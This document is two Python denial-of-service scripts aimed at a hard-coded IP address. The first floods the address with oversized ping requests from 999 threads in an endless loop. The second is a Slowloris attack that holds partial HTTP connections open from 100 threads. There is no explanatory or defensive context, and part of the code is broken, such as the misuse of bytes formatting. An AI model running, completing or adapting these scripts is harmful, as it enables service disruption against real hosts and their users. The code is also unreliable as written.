import os
import time
import threading

def attack():  
    target_ip = "13.232.128.212"

    packet_size = 80000

    packet = os.urandom(packet_size)

    os.system(f"ping -c 1 -s {packet_size} {target_ip}")

    print(f"Sent a large ICMP echo request packet ({packet_size} bytes) to {target_ip}")

def main():
    num_threads = 999  

    while True:
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=attack)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print("Threads finished, restarting...")

if __name__ == "__main__":
    main()


import socket
import threading
import time

# Configuration  # Replace with the target IP address
target_ip = "13.232.128.212"
target_port = 80  # Replace with the target port

def slowloris_attack():
    while True:
        try:
            # Create a new socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target_ip, target_port))
            # Send partial HTTP requests
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(b"Host: {}\r\n".format(target_ip).encode())
            # Keep the connection open
            while True:
                s.send(b"X-a: {}\r\n".format('a' * 1000).encode())
        except Exception as e:
            print(f"Exception: {e}")
        finally:
            s.close()

def main():
    threads = [threading.Thread(target=slowloris_attack) for _ in range(100)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
